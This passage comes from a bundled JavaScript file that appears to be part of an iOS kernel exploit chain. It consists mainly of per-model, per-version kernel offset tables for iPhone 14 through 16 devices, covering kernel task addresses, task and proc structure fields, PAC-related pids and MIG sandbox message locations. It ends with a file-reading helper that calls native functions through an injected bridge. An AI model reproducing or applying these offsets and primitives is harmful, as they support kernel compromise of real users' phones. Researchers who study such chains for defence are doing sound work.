0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x918ee0n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x91d318n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x925770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9256d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x925720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f6230n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x168n,\n\t\t\t\t\tjopPid: 0x170n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f6248n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa02678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9fa678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x448n,\n\t\t\t\t\tmigLock: 0x382c218n,\n\t\t\t\t\tmigSbxMsg: 0x382c238n,\n\t\t\t\t\tmigKernelStackLR: 0x317d020n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x3848428n,\n\t\t\t\t\tmigSbxMsg: 0x3848448n,\n\t\t\t\t\tmigKernelStackLR: 0x31994a4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa73d10n,\n\t\t\t\t\tguardExcCode: 0x340n,\n\t\t\t\t\ttaskThreads: 0x390n,\n\t\t\t\t\ttro: 0x398n,\n\t\t\t\t\tast: 0x3bcn,\n\t\t\t\t\tmutexData: 0x3c8n,\n\t\t\t\t\tctid: 0x450n,\n\t\t\t\t\tmigLock: 0x38543a8n,\n\t\t\t\t\tmigSbxMsg: 0x38543c8n,\n\t\t\t\t\tmigKernelStackLR: 0x31a27e0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"6\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x92d318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x935770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9316d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x931720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa06230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa06248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa12678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa0a678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa77b18n,\n\t\t\t\t\tmigLock: 0x3898c18n,\n\t\t\t\t\tmigSbxMsg: 0x3898c38n,\n\t\t\t\t\tmigKernelStackLR: 0x31dff60n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa7fc00n,\n\t\t\t\t\tmigLock: 0x38b4e28n,\n\t\t\t\t\tmigSbxMsg: 0x38b4e48n,\n\t\t\t\t\tmigKernelStackLR: 0x31fc3e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa83d10n,\n\t\t\t\t\tmigLock: 0x38bcda8n,\n\t\t\t\t\tmigSbxMsg: 0x38bcdc8n,\n\t\t\t\t\tmigKernelStackLR: 0x3205560n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"7\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9216d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f2230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tmigLock: 0x3813d98n,\n\t\t\t\t\tmigSbxMsg: 0x3813db8n,\n\t\t\t\t\tmigKernelStackLR: 0x3163ae0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x382ffa8n,\n\t\t\t\t\tmigSbxMsg: 0x382ffc8n,\n\t\t\t\t\tmigKernelStackLR: 0x317ffa4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fd10n,\n\t\t\t\t\tmigLock: 0x3833fa8n,\n\t\t\t\t\tmigSbxMsg: 0x3833fc8n,\n\t\t\t\t\tmigKernelStackLR: 0x31852a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9216d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f2230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tmigLock: 0x3813d98n,\n\t\t\t\t\tmigSbxMsg: 0x3813db8n,\n\t\t\t\t\tmigKernelStackLR: 0x3163ae0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x382ffa8n,\n\t\t\t\t\tmigSbxMsg: 0x382ffc8n,\n\t\t\t\t\tmigKernelStackLR: 0x317ffa4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fd10n,\n\t\t\t\t\tmigLock: 0x3833fa8n,\n\t\t\t\t\tmigSbxMsg: 0x3833fc8n,\n\t\t\t\t\tmigKernelStackLR: 0x31852a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 14 Pro\n\t// iPhone 14 Pro Max\n\t// iPhone 15\n\t// iPhone 15 Plus\n\t\"iPhone15\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x914e00n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919238n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9215f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921640n\n\t\t\t\t},\n\t\t\t\t6.2: {\n\t\t\t\t\tkernelTask: 0x91d640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9ee150n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x168n,\n\t\t\t\t\tjopPid: 0x170n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2168n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67c18n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x448n,\n\t\t\t\t\tmigLock: 0x37863f8n,\n\t\t\t\t\tmigSbxMsg: 0x3786418n,\n\t\t\t\t\tmigKernelStackLR: 0x3131620n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fd00n,\n\t\t\t\t\tmigLock: 0x37a2788n,\n\t\t\t\t\tmigSbxMsg: 0x37a27a8n,\n\t\t\t\t\tmigKernelStackLR: 0x314dc24n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fe10n,\n  \t\t\t\t\tguardExcCode: 0x340n,\n\t\t\t\t\ttaskThreads: 0x390n,\n  \t\t\t\t\ttro: 0x398n,\n  \t\t\t\t\tast: 0x3bcn,\n\t\t\t\t\tmutexData: 0x3c8n,\n\t\t\t\t\tctid: 0x450n,\n\t\t\t\t\tmigLock: 0x37aa708n,\n\t\t\t\t\tmigSbxMsg: 0x37aa728n,\n\t\t\t\t\tmigKernelStackLR: 0x3152ee0n\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"4\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x941238n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x949690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9495f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x949640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa2a150n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2a168n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3a598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa32598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xaa3c18n,\n\t\t\t\t\tmigLock: 0x38c5388n,\n\t\t\t\t\tmigSbxMsg: 0x38c53a8n,\n\t\t\t\t\tmigKernelStackLR: 0x325f1e0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa7d00n,\n\t\t\t\t\tmigLock: 0x38dd698n,\n\t\t\t\t\tmigSbxMsg: 0x38dd6b8n,\n\t\t\t\t\tmigKernelStackLR: 0x32777e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaabe10n,\n\t\t\t\t\tmigLock: 0x38e5618n,\n\t\t\t\t\tmigSbxMsg: 0x38e5638n,\n\t\t\t\t\tmigKernelStackLR: 0x3280aa0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x941238n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x949690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9495f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x949640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa2a150n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2a168n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3a598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa32598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xaa3c18n,\n\t\t\t\t\tmigLock: 0x38c5388n,\n\t\t\t\t\tmigSbxMsg: 0x38c53a8n,\n\t\t\t\t\tmigKernelStackLR: 0x325f1e0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa7d00n,\n\t\t\t\t\tmigLock: 0x38dd698n,\n\t\t\t\t\tmigSbxMsg: 0x38dd6b8n,\n\t\t\t\t\tmigKernelStackLR: 0x32777e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaabe10n,\n\t\t\t\t\tmigLock: 0x38e5618n,\n\t\t\t\t\tmigSbxMsg: 0x38e5638n,\n\t\t\t\t\tmigKernelStackLR: 0x3280aa0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 15 Pro\n\t// iPhone 15 Pro Max\n\t\"iPhone16\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0x140n,\n\t\t\t\t\tropPid: 0x1b0n,\n\t\t\t\t\tjopPid: 0x1b8n,\n\t\t\t\t\tguardExcCode: 0x380n,\n\t\t\t\t\ttaskThreads: 0x3c0n,\n\t\t\t\t\ttro: 0x3d0n,\n\t\t\t\t\tast: 0x3f4n,\n\t\t\t\t\tmutexData: 0x400n,\n\t\t\t\t\tctid: 0x480n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x978ef0n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x991eb0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\toptions: 0xc0n,\n\t\t\t\t\tguardExcCode: 0x388n,\n\t\t\t\t\ttaskThreads: 0x3c8n,\n\t\t\t\t\ttro: 0x3d8n,\n\t\t\t\t\tast: 0x3fcn,\n\t\t\t\t\tmutexData: 0x408n,\n\t\t\t\t\tctid: 0x488n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x99a308n,\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x99a268n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x99a2b8n\n\t\t\t\t},\n\t\t\t\t6.2: {\n\t\t\t\t\tkernelTask: 0x9962b8n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xaae870n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x388n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x490n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xaae888n,\n\t\t\t\t\ttaskThreads: 0x3d0n,\n\t\t\t\t\ttro: 0x3d8n,\n\t\t\t\t\tast: 0x3fcn,\n\t\t\t\t\tmutexData: 0x408n,\n\t\t\t\t\tctid: 0x488n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xab6cb8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xab2cb8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xb23d28n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x498n,\n\t\t\t\t\tmigLock: 0x3c03ef0n,\n\t\t\t\t\tmigSbxMsg: 0x3c03f10n,\n\t\t\t\t\tmigKernelStackLR: 0x3582fe0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xb2be10n,\n\t\t\t\t\tmigLock: 0x3c181a8n,\n\t\t\t\t\tmigSbxMsg: 0x3c181c8n,\n\t\t\t\t\tmigKernelStackLR: 0x35993a4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xb2ff20n,\n  \t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t\tmigLock: 0x3c241a8n,\n\t\t\t\t\tmigSbxMsg: 0x3c241c8n,\n\t\t\t\t\tmigKernelStackLR: 0x35a26a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\t// iPhone 16\n\t// iPhone 16 plus\n\t// iPhone 16 pro\n\t// iPhone 16 pro max\n\t\"iPhone17\": {\n\t\t\"*\": {\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xb7e1c8n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xb7e1e0n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xb86610n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xb82610n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xc0fd80n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\tmigLock: 0x4042dc0n,\n\t\t\t\t\tmigSbxMsg: 0x4042de0n,\n\t\t\t\t\tmigKernelStackLR: 0x3912aa0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xc17e68n,\n\t\t\t\t\tmigLock: 0x405eff8n,\n\t\t\t\t\tmigSbxMsg: 0x405f018n,\n\t\t\t\t\tmigKernelStackLR: 0x392be64n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xc1bf78n,\n  \t\t\t\t\tguardExcCode: 0x398n,\n\t\t\t\t\ttaskThreads: 0x3e8n,\n  \t\t\t\t\ttro: 0x3f0n,\n\t\t\t\t\tast: 0x414n,\n\t\t\t\t\tmutexData: 0x420n,\n\t\t\t\t\tctid: 0x4b0n,\n\t\t\t\t\tmigLock: 0x4066f88n,\n\t\t\t\t\tmigSbxMsg: 0x4066fa8n,\n\t\t\t\t\tmigKernelStackLR: 0x39352e0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xb7e1c8n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xb7e1e0n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xb86610n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xb82610n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xc0fd80n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\tmigLock: 0x408acd0n,\n\t\t\t\t\tmigSbxMsg: 0x408acf0n,\n\t\t\t\t\tmigKernelStackLR: 0x396e4a0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xc17e68n,\n\t\t\t\t\tmigLock: 0x40a6f08n,\n\t\t\t\t\tmigSbxMsg: 0x40a6f28n,\n\t\t\t\t\tmigKernelStackLR: 0x3987924n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xc1ff78n,\n\t\t\t\t\tguardExcCode: 0x398n,\n\t\t\t\t\ttaskThreads: 0x3e8n,\n\t\t\t\t\ttro: 0x3f0n,\n\t\t\t\t\tast: 0x414n,\n\t\t\t\t\tmutexData: 0x420n,\n\t\t\t\t\tctid: 0x4b0n,\n\t\t\t\t\tmigLock: 0x40b6e98n,\n\t\t\t\t\tmigSbxMsg: 0x40b6eb8n,\n\t\t\t\t\tmigKernelStackLR: 0x3998de0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/JSUtils/FileUtils.js\":\n/*!***************************************!*\\\n  !*** ./src/libs/JSUtils/FileUtils.js ***!\n  \\***************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ FileUtils)\n/* harmony export */ });\n\n\nconst TAG = \"FILE-UTILS\";\n\nconst O_RDONLY\t= 0x0000;\nconst O_WRONLY\t= 0x0001;\nconst O_RDWR\t= 0x0002;\nconst O_APPEND  = 0x0008;\nconst O_CREAT\t= 0x0200;\nconst O_TRUNC\t= 0x0400;\nconst O_EVTONLY\t= 0x8000;\n\nconst ERROR\t\t= -1;\n\nconst DT = {\n\tDT_UNKNOWN: 0,\n\tDT_FIFO: 1,\n\tDT_CHR: 2,\n\tDT_DIR: 4,\n\tDT_BLK: 6,\n\tDT_REG: 8,\n\tDT_LNK: 10,\n\tDT_SOCK: 12,\n\tDT_WHT: 14\n};\n\nconst SEEK_SET = 0;\n\nclass FileUtils {\n\n\n\tstatic open(path) {\n\t\tconst fd = Native.callSymbol(\"open\", path, O_RDONLY);\n\t\tif (fd == ERROR) {\n\t\t\tconsole.log(TAG, \"Unable to open: \" + path);\n\t\t\treturn false;\n\t\t}\n\t\treturn fd;\n\t}\n\n\tstatic close(fd) {\n\t\tNative.callSymbol(\"close\", fd);\n\t}\n\n\tstatic read(fd, size=0) {\n\t\tif (!size || size > Native.memSize)\n\t\t\tsize = Native.memSize;\n\t\tconst len = Native.callSymbol(\"read\", fd, Native.mem, size);\n\t\tif (!len || len == ERROR)\n\t\t\treturn false;\n\t\tconst buff = Native.read(Native.mem, len);\n\t\treturn buff;\n\t}\n\n\tstatic readFile(path, seek=0, length=0) {\n\t\tconst fd = this.open(path);\n\t\tif (fd === false)\n\t\t\treturn null;\n\n\t\tlet data = new Uint8Array();\n\n\t\tif (seek)\n\t\t\tNative.callSymbol(\"lseek\", fd, seek, SEEK_SET);\n\n\t\tlet remaining = length;\n\n\t\twhile (true) {\n\t\t\tlet size = remaining ? remaining : Native.memSize;\n\t\t\tif (size > Native.memSize)\n\t\t\t\tsize = 